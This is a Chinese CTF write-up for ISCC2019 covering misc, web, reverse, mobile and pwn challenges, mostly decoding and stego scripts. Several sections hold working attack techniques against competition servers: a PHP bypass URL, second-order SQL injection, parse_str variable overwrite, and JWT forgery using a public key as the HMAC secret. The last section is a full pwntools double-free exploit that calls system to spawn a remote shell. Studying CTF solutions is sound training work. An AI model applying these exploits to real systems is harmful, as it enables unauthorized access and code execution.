> 原文链接: https://www.anquanke.com//post/id/179216 


# ISCC2019部分writeup


                                阅读量   
                                **451412**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">9</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



## [![](https://p2.ssl.qhimg.com/dm/1024_681_/t0183c6e433b68e2ae2.jpg)](https://p2.ssl.qhimg.com/dm/1024_681_/t0183c6e433b68e2ae2.jpg)

## Misc

### <a class="reference-link" name="1.%20%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF"></a>1. 隐藏的信息

下载压缩包，解压缩拿到一个文本文件，打开发现是一堆八进制，写个脚本来ASCII值转字符串，转完之后发现是一个base64加密，将一开始的脚本修改一下，添加base64转码功能，再次运行拿到flag

```
import binascii
import base64
x="0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 " 
  "066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 " 
  "0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113 "

x = x.split()
z = ''
for i in range(len(x)):
    y = str(hex(int(x[i], 8)))[2:]
    # print(y)
    a = str(binascii.a2b_hex(y))#[2:3]
    z += str(a)
# print(z)
z = base64.b64decode(z)
print(z)
```

### <a class="reference-link" name="2.%20%E6%9C%80%E5%8D%B1%E9%99%A9%E7%9A%84%E5%9C%B0%E6%96%B9%E5%B0%B1%E6%98%AF%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E5%9C%B0%E6%96%B9"></a>2. 最危险的地方就是最安全的地方

题目文件解压后是一张JPG图片，盲猜带有压缩包，后缀改为zip解压缩，拿到50张二维码，发现最后一张的图片文件格式和其它49张不一样，记事本打开，开头就看到flag

### <a class="reference-link" name="3.%20%E8%A7%A3%E5%AF%86%E6%88%90%E7%BB%A9%E5%8D%95"></a>3. 解密成绩单

题目文件解压后拿到一个exe文件，用各种misc做题方法尝试后均无果，猜测其实是简单的逆向题，用ida打开：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01820275e37dbd3673.png)<br>
看到检查输入的函数，跟入直接看到要求的用户名和密码，直接复制粘贴到程序输入框内点击ok即可拿到flag

### <a class="reference-link" name="4.%20Welcome"></a>4. Welcome

改后缀解压得到.txt文件，打开发现由“蓅烺計劃 洮蓠朩暒”和“戶囗 萇條”组成的编码，将前者用0替换，后者用1替换，得到011001100110110001100001011001110111101101001001010100110100001101000011010111110101011101000101010011000100001101001111010011010100010101111101<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015062c1d322abd6d6.png)<br>
二进制转到字符串即可得到flag<br>[![](https://p2.ssl.qhimg.com/t01618dbb897e300c36.png)](https://p2.ssl.qhimg.com/t01618dbb897e300c36.png)

### <a class="reference-link" name="5.%20%E5%80%92%E7%AB%8B%E5%B1%8B"></a>5. 倒立屋

lsb加密，使用stegsolve三色道分析神器查看lsb加密内容，然后将看到的字符，顺序反过来，即为flag ，是不是很坑<br>[![](https://p2.ssl.qhimg.com/t0129a50acf8d767635.png)](https://p2.ssl.qhimg.com/t0129a50acf8d767635.png)

### <a class="reference-link" name="6.%E6%97%A0%E6%B3%95%E8%BF%90%E8%A1%8C%E7%9A%84exe"></a>6.无法运行的exe

解压题目后拿到exe文件，发现无法运行，winhex查看发现是个其实文本文件，文本内容像是图片base64转码，用在线base64转图片工具发现无法转图片，自己写个py脚本实现，如下：(将原文件名重命名为1.txt)

```
import base64
a=open('1.txt','rb').read()
d=base64.b64decode(a)
filename='2.png'
with open(filename,'w') as file_project:
    file_project.write(d)
```

打开2.txt查看发现是png文件，改为png后缀打开，发现报错，百度png文件格式，发现头部数据被修改了，改回来：<br>[![](https://p5.ssl.qhimg.com/t01f34f0073b2bd4a73.png)](https://p5.ssl.qhimg.com/t01f34f0073b2bd4a73.png)这是我们转码后拿到的文件开头hex值，png文件开头应为：89504E470D0A1A0A<br>
修复文件头后打开是二维码，用QR扫码工具扫描拿到flag

### <a class="reference-link" name="7.%20High%E8%B5%B7%E6%9D%A5%EF%BC%81"></a>7. High起来！

解压缩拿到一个二维码图片，扫码后拿到一串当铺密码，在线工具解码拿到一串数字。<br>
个人觉得这不是flag，提交了一下尝试，果然不是，发现二维码图片大小异常，比普通二维码大了，猜测包含其他文件，binwalk发现压缩包，解压后是一段mp3音频，用mp3隐写工具解密，推测一开始拿到的数字是密钥，果然解密出来文本，是html编码，在线工具解码拿到flag

### <a class="reference-link" name="8.%20%E4%BB%96%E4%BB%AC%E8%83%BD%E5%9C%A8%E4%B8%80%E8%B5%B7%E5%90%97%EF%BC%9F"></a>8. 他们能在一起吗？

首先得到一个二维码<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e6234339ef310e05.png)<br>
UEFTUyU3QjBLX0lfTDBWM19ZMHUlMjElN0Q=

BASE64解密为：PASS`{`0K_I_L0V3_Y0u!`}`

从二维码分离出一个加密了的压缩包，用刚才得到的密钥解密的到含有flag的.txt文件<br>
得到flag：ISCC`{`S0rrY_W3_4R3_Ju5T_Fr1END`}`

### <a class="reference-link" name="9.%20Keyes%E2%80%99%20secret"></a>9. Keyes’ secret

仔细看一下文件开头的字母，结合提示，发现就是一个简单的键盘加密（画键盘），而且似乎每一个字母的加密方式都一样，用文本的替换功能即可获取原文。<br>
例：<br>[![](https://p1.ssl.qhimg.com/t018bab1408b6f64b09.png)](https://p1.ssl.qhimg.com/t018bab1408b6f64b09.png)

### <a class="reference-link" name="10.%20Aesop%E2%80%99s%20secret"></a>10. Aesop’s secret

动态图的每一帧只显示图片的一部分，用stegsolve神器的”Frame Browser”将其每一帧保存出来，用ps合成一下，或者用stegsolve的”Image Combiner”功能里的”add”直接将图片内容合到一起，发现图片内容是”ISCC”<br>[![](https://p5.ssl.qhimg.com/t0181c7ed3b9db3d6bb.png)](https://p5.ssl.qhimg.com/t0181c7ed3b9db3d6bb.png)<br>
再用stegsolve的 “File Format” 查看图片信息的时候发现其所转换的ascii码的内容是密文，<br>[![](https://p3.ssl.qhimg.com/t01eb64647e59f3cc28.png)](https://p3.ssl.qhimg.com/t01eb64647e59f3cc28.png)<br>
推测ISCC是密钥，通过两次AES解密（[https://www.bejson.com/enc/aesdes/）](https://www.bejson.com/enc/aesdes/%EF%BC%89)<br>[![](https://p0.ssl.qhimg.com/t01ec91983f3619c98c.png)](https://p0.ssl.qhimg.com/t01ec91983f3619c98c.png)<br>[![](https://p1.ssl.qhimg.com/t01be0ba6d018244aef.png)](https://p1.ssl.qhimg.com/t01be0ba6d018244aef.png)<br>
拿到flag

### <a class="reference-link" name="11.%20%E7%A2%8E%E7%BA%B8%E6%9C%BA"></a>11. 碎纸机

用binwalk检查下给出的这张jpg图片，发现有个压缩包，解压缩拿到10张拼图文件，提示说欧鹏曦文同学可以恢复其原貌，但要给它真正有用的东西，用winhex查看发现每张拼图文件结尾都多了一串等长的hex值，将其提取出来。根据谐音推测欧鹏曦文指的是opencv，是一种计算机视觉库，处理图形用的。应该是要把多出来的hex值转为图片，多出来的十串hex值长度都为2500，刚好是50*50，但是百度了好久也没有找到opencv创建图形文件后如何处理每个坐标处像素的教程，于是用了image库，脚本如下：

```
# coding=utf-8
from PIL import Image
import matplotlib.pyplot as plt
X=50
Y=500
pic = Image.new("RGB",(X,Y))
str = open('0.txt').read() #我将十段hex值都写进一个txt文档了，方便处理
i=0
for y in range (0,Y):
    for x in range (0,X):
        if(str[i] =='1'):
            pic.putpixel([x,y],(0,0,0))
        else:
            pic.putpixel([x,y],(255,255,255))
        i = i+1

pic.show()
pic.save("flag.png")
#                       _oo0oo_       虽  但  我
#                      o8888888o      然  没  的
#                      88" . "88      我  这  脚
#                      ( -_- )        并  段  本
#                      0  =  /0      不  注  跑
#                    ___/`---'___    迷  释  不
#                  .' \     // '.    信  时  动
#                 / \  :  //        ，  ，  。
#                / _ -:- -                  。
#                   \  -  ///              。
#                _  ''---/''  _/ 
#                 .-__  '-'  ___/-. /
#             ___'. .'  /--.--  `. .'___
#          ."" '&lt;  `.____&lt;&gt;_/___.' &gt;' "".
#           :  `- `.;` _ /`;.`/ - ` :  
#            `_.   _ __ /__ _/   .-` /  /
#     =====`-.____`.___ _____/___.-`___.-'=====
#                       `=---='
#
#
#     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
#               佛祖保佑         永无BUG
```

图片内容被ps过，不过不影响查看flag

## Web

### <a class="reference-link" name="1.%20web1"></a>1. web1

```
&lt;?php
error_reporting(0);
require 'flag.php';
$value = $_GET['value'];
$password = $_GET['password'];
$username = '';

for ($i = 0; $i &lt; count($value); ++$i) `{`
    if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);
    else $username .= chr($value[$i]);
    if ($username == 'w3lc0me_To_ISCC2019' &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) `{`
        echo 'Hello '.$username.'!', '&lt;br&gt;', PHP_EOL;
        echo $flag, '&lt;hr&gt;';
    `}`
`}`

highlight_file(__FILE__);
```

发现关键的几个地方<br>
1.存在chr函数<br>
2.存在intval函数<br>
由此，我们需要构造不同的value[i]，这里通过if过滤掉了username字符中出现的ascll码，但 是，chr函数在处理大于256的ascll时会对256进行取余，所以我们在原字符的ascll码上＋256即可。

intval由于存在弱类型转换的问题，在转换时的值会小1，轻松绕过判断，最终构造payload：

```
http: //39.100.83.188:8001/?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=0x91d
```

### <a class="reference-link" name="2.%20web2"></a>2. web2

提示3位数密码，不用说肯定是爆破。但是存在于验证码，我们先抓包<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d43000105a86c469.png)<br>
我们去爆破却失败了，这是为什么呢？<br>
关键就在于这个cookie<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e2917f448cfb15b5.png)<br>
不改变cookie，得到的结果永远都是一样的，所以这里我们直接删除cookie重新爆破。<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ee5e08be5a937c63.png)<br>
看到996返回length不同，尝试用996去登录，得到Flag。

### <a class="reference-link" name="3.%20web3"></a>3. web3

二次注入，首先注册用户admin’—xx（xx代表任何字符，这里#好像被过滤了）,登陆之后修改密码,这里直接修改了admin的密码，再以修改的密码以admin为username登陆，拿到flag

### <a class="reference-link" name="4.%20web4"></a>4. web4

进来审计源码

```
&lt;?php 
error_reporting(0); 
include("flag.php"); 
$hashed_key = 'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a'; 
$parsed = parse_url($_SERVER['REQUEST_URI']); 
if(isset($parsed["query"]))`{` 
    $query = $parsed["query"]; 
    $parsed_query = parse_str($query); 
    if($parsed_query!=NULL)`{` 
        $action = $parsed_query['action']; 
    `}` 

    if($action==="auth")`{` 
        $key = $_GET["key"]; 
        $hashed_input = hash('sha256', $key); 
        if($hashed_input!==$hashed_key)`{` 
            die("&lt;img src='cxk.jpg'&gt;"); 
        `}` 

        echo $flag; 
    `}` 
`}`else`{` 
    show_source(__FILE__); 
`}`?&gt;
```

审计发现，我们必须提供两个参数action和key，并且使用sha256进行哈希处理后必须等于代码顶部的哈希值。<br>
首先试一下解密hashed_key的值，但是很不幸并没有解密出来。<br>
但是我们看到出现parse_str()函数，变量覆盖的典型代表函数，所以我恶魔你直接变量覆盖掉hashed_key<br>
使用大神的脚本跑出hash的值为9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08<br>
构造payload：

```
action=auth&amp;key=test&amp;hashed_key=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08
```

### <a class="reference-link" name="5.%20web5"></a>5. web5

提示 看来你并不是Union.373组织成员，请勿入内！<br>
改u-a头<br>
后：请输入用户名<br>
注入，过滤了圆括号，注释符，from等等<br>
payload ：order by 排序盲注<br>[![](https://p5.ssl.qhimg.com/t01d0009a6ed1ebc657.png)](https://p5.ssl.qhimg.com/t01d0009a6ed1ebc657.png)

### <a class="reference-link" name="6.web6"></a>6.web6

这是一个构造jwt头攻击的题目。<br>
进入题目后查看源代码，在common.js文件里找到关键信息：

```
function getpubkey()
`{`
    /* 
    get the pubkey for test
    /pubkey/`{`md5(username+password)`}`
    */
`}`
```

很明显是个公钥获取提示，将自己注册的用户名和密码合在一起取md5值,以此访问公钥文件。<br>
拿到公钥

```
`{`"pubkey":"-----BEGIN PUBLIC KEY-----nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PKnomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1hnKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtucnIC+LX+9V/mpyKe9R3wIDAQABn-----END PUBLIC KEY-----","result":true`}`
```

但很明显，公钥是有格式的，直接拿来用坑定不行，用python的print命令输出一下，防止人工修格式修错,然后将其复制到txt里

```
a="-----BEGIN PUBLIC KEY-----nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PKnomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1hnKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtucnIC+LX+9V/mpyKe9R3wIDAQABn-----END PUBLIC KEY-----"
print a
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0122f58656c4c1ac94.png)<br>
用这个公钥构造token头访问list

```
import jwt
import base64
public = open('1.txt','r').read()
print (jwt.encode(`{`"name": "xibai21","priv": "admin"`}`, key=public, algorithm='HS256'))
```

token头自然是抓包将原本的换为我们自行构造的token，注意token头中的name是自己的公钥对应的用户名，admin自然是管理员用户名。<br>
发包后在list中看到关键信息：<br>[![](https://p1.ssl.qhimg.com/t01fb7b71c2489b13e3.png)](https://p1.ssl.qhimg.com/t01fb7b71c2489b13e3.png)<br>
访问/text/admin:。。。。。。，即可拿到flag

## Reverse

### <a class="reference-link" name="1.%20answer%20to%20everything"></a>1. answer to everything

ida载入main函数一键f5，审计一波发现以下关键：<br>[![](https://p3.ssl.qhimg.com/t010adb95d57962ffa9.png)](https://p3.ssl.qhimg.com/t010adb95d57962ffa9.png)<br>
不带任何标签提交，结合题目提示sha1， kdudpeh 的sha1值即为所要flag

### <a class="reference-link" name="2.%20dig%20dig%20dig"></a>2. dig dig dig

用IDA载入分析<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016616e9dfdb76e913.png)<br>
发现对字符串进行了三次加密<br>
分别为BASE64,ROT13,UUencode<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ccfbf5fbe4b65058.png)<br>
对字符串逆着进行三次解密，得到flag<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ccbe7e5b61fdd1e4.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a127c8efaf4de35d.png)<br>[![](https://p2.ssl.qhimg.com/t010b727c4faa860837.png)](https://p2.ssl.qhimg.com/t010b727c4faa860837.png)

### <a class="reference-link" name="3.%E7%AE%80%E5%8D%95Python"></a>3.简单Python

题目内容很简单<br>
提示说要逆向一个pyc<br>
虽然没有了解过这个东西，不过在网上找到了在线的反编译工具<br>
直接拉进去 运行<br>
得到如下内容：

```
import base64

def encode(message):
    s = ''
    for i in message:
        x = ord(i) ^ 32
        x = x + 16
        s += chr(x)

    return base64.b64encode(s)

correct = 'eYNzc2tjWV1gXFWPYGlTbQ=='
flag = ''
print 'Input flag:'
flag = raw_input()
if encode(flag) == correct:
    print 'correct'
else:
    print 'wrong'
```

这就很棒了<br>
源码都有了 什么是逆不出来的<br>
这里需要注意一下的是correct的内容最好不要用网上的Base64解码工具解码<br>
最好用Python的base64模块解码<br>
简单写一下Python得到decode后的字符串

```
yx83sskcY]`\Ux8f`iSm
```

然后写一个脚本，跑一下就出来了<br>
脚本如下：

```
#include &lt;iostream&gt;

using namespace std;

int main ()

`{`

    char buffer[512]="yx83sskcY]`\Ux8f`iSm";

    for(int i=0;i&lt;strlen(buffer);i++)

    `{`

        buffer[i]-=16;

        buffer[i]^=32;

    `}`

    for(int i=0;i&lt;strlen(buffer);i++)

    cout&lt;&lt;buffer[i];

    return 0;

`}`
```

结束。

### <a class="reference-link" name="4.%20Rev04"></a>4. Rev04

拉入od提示文件损坏，去百度elf文件的格式，发现其格式不固定，格式基本固定的地方又没有发现有什么明显的错误，但是记事本打开查看内容时发现一串极为可疑的字符：<br>
数了下长度，符合base64加密的密文长度，base64转码，果然有问题：

[![](https://p2.ssl.qhimg.com/t01d4459ed97ad147b0.png)](https://p2.ssl.qhimg.com/t01d4459ed97ad147b0.png)

```
uggc://VFPP2019`{`hey_frrzf_ebggra_jvgu`}`pgs.pbz
```

显然是flag密文，多次解密尝试后发现是rot13加密，在线解rot13即可

### <a class="reference-link" name="5.%20Rev01"></a>5. Rev01

这是一个rust逆向。载入ida分析<br>[![](https://p5.ssl.qhimg.com/t017b9db92d6638b8de.png)](https://p5.ssl.qhimg.com/t017b9db92d6638b8de.png)<br>
需要留意，rust语言写出来的程序其主函数为“beginer_reverse::main::……..”，所以对main反编译是找不到正确的东西的。<br>[![](https://p5.ssl.qhimg.com/t010723a6f8c68179fc.png)](https://p5.ssl.qhimg.com/t010723a6f8c68179fc.png)<br>
进入之后即看到一串明显像是密文的东西。向下翻找到唯一一个具备加密转码性质的代码<br>[![](https://p5.ssl.qhimg.com/t017b62c216c99baedf.png)](https://p5.ssl.qhimg.com/t017b62c216c99baedf.png)<br>
其中 v33 恰是开头的v0，很明显就是将上面的内容转码后和输入进行比对，仔细审计中间的代码会发现v15对应的是输入。写出解密脚本：

# <a class="reference-link" name="coding=utf-8"></a>coding=utf-8

cipher = [0x00000154,0x00000180,0x000001FC,0x000001E4,0x000001F8,0x00000154,0x00000190,0x000001BC,0x00001BC,0x000001B8,0x00000154,0x000001F8,0x0000194,0x00000154,0x000001B4,0x000001BC,0x00001F8,0x00000154,0x000001F4,0x00000188,0x00001AC,0x000001F8,0x00000154,0x0000018C,0x00001E4,0x00000154,0x00000190,0x000001BC,0x154,0x90]

```
#以上数据经过转码后拿到数据要进行一次ascii码转换，但是第一次转出来的是str类型下的数字，不能直接输出ascii码对应的字符，所以需要用chr()处理一下
cipher2=''
for i in range(len(cipher)):
    cipher2+=chr((cipher[i]&gt;&gt;2)^0xA)
print cipher2
#也可以用一个直接点的代码处理
cipher1 = ''.join(map(lambda x: chr((x&gt;&gt;2) ^ 0xa), cipher))
print cipher1
```

## Mobile

### <a class="reference-link" name="Mobile01"></a>Mobile01

使用jeb查看反汇编代码，发现有两个关键函数 checkFrist 和 checkSecond<br>
checkFrist查看其内部内容发现是检查输入字符串，要求字符串长度为16位，范围在1到8之间<br>
checkSecond在Native层里面，调用的是c/c++代码，jeb中无法查看，用ida打开apk包里面的lib下的so文件（ida需要加载jni模块，不然反汇编的代码相对会比较复杂，不利于逆向分析）。<br>
发现checksecond函数中要求前八位必须是递增关系，即前八位为“12345678”<br>
后八位则给了相关约束条件，写一个脚本跑一下即可：

```
#调用z3求解器
from z3 import *
import time      #记录计算时间用，舍弃也可以
t1=time.time()   #记录计算时间用，舍弃也可以
#设一个解决样例
solver=Solver()
#设置样例flag长度
flag=[Int('flag%d'%i) for i in range(16)]
#给flag的每一位添加范围约束（0，9）
for i in range(16):
solver.add(flag[i]&gt;0)
solver.add(flag[i]&lt;9)
#设置样例flag前八位数值
for i in range(8):
    solver.add(flag[i]==i+1)
#添加逆向分析时得到的条件约束
solver.add(flag[9]+flag[14]==14)
solver.add(flag[8]&lt;=3)
for j in range(1,8):
for k in range(0,8):
if(k&gt;=j):
break
solver.add(flag[k]!=flag[j])
solver.add(flag[k+8]!=flag[j+8])
solver.add((flag[j]-flag[k])!=(flag[j+8]-flag[k+8]))
solver.add((flag[j]-flag[k])!=(flag[k+8]-flag[j+8]))
#这个检查应该是判断是否有解，有则输出flag，无则报错
if(solver.check()==sat):
m=solver.model()
s=[]
for i in range(16):
s.append(m[flag[i]].as_long())
    print(bytes(s))
else:
print('error')
t2=time.time()
print(t2-t1)

```

## Pwn

### <a class="reference-link" name="pwn02"></a>pwn02

```
from pwn import *
#context.log_level = 'debug'


IP = '39.100.87.24'
PORT = 8102
LOCAL = 0


if LOCAL:
sh = process('./pwn02')
else:
sh = remote(IP, PORT)




def debug(cmd=''):
gdb.attach(sh, cmd)
pause()




def malloc(idx, size, ctx):
sh.recvuntil('&gt; ')
sh.sendline('1 '+str(idx))
sh.sendline(str(size))
sh.sendline(ctx)


def free(idx):
sh.recvuntil('&gt; ')
sh.sendline('2 '+str(idx))


def puts(idx):
sh.recvuntil('&gt; ')
sh.sendline('3 '+str(idx))




malloc(0, 0x58, "aa")
malloc(1, 0x58, "bb")
malloc(2, 0x58, "cc")
malloc(3, 0x80, "dd")
malloc(4, 0x10, "ee")


# unsorted bin leak
free(3)
puts(3)
leak = sh.recvuntil('x7f').ljust(8, "x00")
leak = u64(leak)


libc_base = 0
if LOCAL:
libc_base = leak-3951480
else:
libc_base = leak-3951480


# ubuntu 1604 server
log.success("libc base: %s" %hex(libc_base))




# double free
free(0)
free(1)
free(0)


payload = "f"*80
payload += p64(0)+p64(0x61)
payload += p64(0x600dba)


malloc(5, 0x58, payload)
malloc(6, 0x58, "gg")


system = libc_base + 0x45390
payload = "h"* 6 + p64(system)*2
malloc(7, 0x58, payload)


malloc(8, 0x20, "/bin/shx00")
free(8)


#debug()


sh.interactive()
```
